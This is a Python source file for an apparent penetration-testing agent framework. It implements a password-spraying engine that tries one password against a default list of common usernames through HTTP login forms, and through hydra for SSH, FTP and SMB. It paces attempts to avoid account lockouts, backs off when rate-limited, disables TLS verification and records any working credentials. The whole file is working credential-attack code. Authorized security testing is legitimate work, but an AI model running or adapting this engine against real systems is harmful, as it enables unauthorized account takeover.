from __future__ import annotations

import json
import subprocess
import time
from typing import Any

import requests

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


class SprayEngine(BaseEngine):
    name = "spray"
    description = "Password spraying controlado. Prueba una sola contraseña contra multiples usuarios/servicios evitando lockouts. Soporta HTTP, SSH, FTP, SMB, IMAP."
    capabilities = ["password_attack", "password_spraying", "auth_bypass", "credential_testing"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings = []
        raw_lines: list[str] = []

        password = kwargs.get("password", target)
        usernames = kwargs.get("usernames", ["admin", "Administrator", "root", "user", "test"])
        service = kwargs.get("service", "http")
        delay = float(kwargs.get("delay", 2.0))
        timeout = int(kwargs.get("timeout", 300))
        port = int(kwargs.get("port", 0))
        domain = kwargs.get("domain", "")

        if isinstance(usernames, str):
            usernames = [u.strip() for u in usernames.split(",") if u.strip()]

        raw_lines.append(f"[INFO] Password spraying: {password!r} contra {len(usernames)} usuarios en {target} ({service})")
        raw_lines.append(f"[INFO] Delay: {delay}s entre intentos (anti-lockout)")

        spray_start = time.time()
        attempts = 0
        successes = 0

        if service in ("http", "https"):
            protocol = "https" if kwargs.get("ssl", service == "https") else "http"
            base_url = f"{protocol}://{target}"
            if port:
                base_url = f"{protocol}://{target}:{port}"

            login_path = kwargs.get("login_path", "/login")
            login_url = f"{base_url}{login_path}"
            data_field_user = kwargs.get("user_field", "username")
            data_field_pass = kwargs.get("pass_field", "password")

            raw_lines.append(f"[INFO] HTTP spray: POST {login_url}")

            for username in usernames:
                if time.time() - spray_start > timeout:
                    raw_lines.append("[TIMEOUT] Spray timeout alcanzado")
                    break

                attempts += 1
                try:
                    r = requests.post(
                        login_url,
                        data={data_field_user: username, data_field_pass: password},
                        timeout=10, verify=False, allow_redirects=False,
                    )

                    # Check for successful login indicators
                    if r.status_code in (200, 302, 301) and "invalid" not in r.text.lower()[:200]:
                        successes += 1
                        raw_lines.append(f"[HIGH] Credencial valida: {username}:{password} (HTTP {r.status_code})")
                        findings.append({
                            "file_path": target,
                            "line_start": 0, "line_end": 0,
                            "severity": "critical",
                            "title": f"Password spray exitoso: {username}:{password}",
                            "description": f"Credenciales validas encontradas via password spraying HTTP en {login_url}: {username}:{password}",
                            "tool": self.name,
                            "rule_id": f"spray-http-{username.lower()}",
                            "username": username,
                            "password": password,
                            "service": service,
                            "url": login_url,
                        })
                    elif r.status_code == 429 or r.status_code == 503:
                        raw_lines.append(f"[WARN] Rate limited en intento {attempts} ({username}) — aumentando delay")
                        time.sleep(delay * 3)
                    else:
                        raw_lines.append(f"[INFO] {username}:{password} -> HTTP {r.status_code}")

                except requests.exceptions.ConnectionError:
                    raw_lines.append(f"[ERR] Conexion rechazada en {login_url}")
                    break
                except requests.exceptions.Timeout:
                    raw_lines.append(f"[TIMEOUT] Timeout en {username}")
                except Exception as e:
                    raw_lines.append(f"[ERR] {username}: {e}")

                time.sleep(delay)

        elif service in ("ssh", "ftp", "smb"):
            raw_lines.append(f"[INFO] {service.upper()} spray via hydra...")

            # Delegate to hydra with one password
            for username in usernames:
                if time.time() - spray_start > timeout:
                    raw_lines.append("[TIMEOUT] Spray timeout")
                    break

                attempts += 1
                try:
                    hydra_args = [
                        "hydra", "-l", username, "-p", password,
                        str(target), service,
                    ]
                    if port:
                        hydra_args = ["hydra", "-l", username, "-p", password,
                                      "-s", str(port), str(target), service]

                    result = subprocess.run(
                        hydra_args, capture_output=True, text=True, timeout=30,
                    )
                    output = result.stdout + result.stderr

                    if f"login: {username}" in output and f"password: {password}" in output:
                        successes += 1
                        raw_lines.append(f"[HIGH] {service.upper()} credencial valida: {username}:{password}")
                        findings.append({
                            "file_path": target,
                            "line_start": 0, "line_end": 0,
                            "severity": "critical",
                            "title": f"Password spray {service.upper()}: {username}:{password}",
                            "description": f"Credencial {service.upper()} valida via password spraying: {username}:{password} en {target}",
                            "tool": self.name,
                            "rule_id": f"spray-{service}-{username.lower()}",
                            "username": username,
                            "password": password,
                            "service": service,
                        })
                    else:
                        raw_lines.append(f"[INFO] {username}:{password} -> invalido")

                except FileNotFoundError:
                    raw_lines.append("[WARN] hydra no instalado")
                    break
                except subprocess.TimeoutExpired:
                    raw_lines.append(f"[TIMEOUT] hydra timeout en {username}")
                except Exception as e:
                    raw_lines.append(f"[ERR] {username}: {e}")

                time.sleep(delay)

        total_time = time.time() - spray_start
        raw_lines.append(f"[DONE] Spray completado: {attempts} intentos, {successes} exitos en {total_time:.1f}s")

        # Summary finding
        if successes == 0:
            findings.append({
                "file_path": target,
                "line_start": 0, "line_end": 0,
                "severity": "info",
                "title": "Password spraying: sin credenciales validas",
                "description": f"Se probo la password {password!r} contra {attempts} usuarios en {service}://{target}. Ninguna coincidencia.",
                "tool": self.name,
                "rule_id": "spray-no-success",
                "password_tested": password,
                "users_tested": len(usernames),
                "service": service,
            })

        summary = f"spray: {successes}/{attempts} credenciales validas con password {password!r}"
        return EngineResult(
            success=successes > 0,
            raw_output="\n".join(raw_lines),
            findings=findings,
            summary=summary,
        )

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
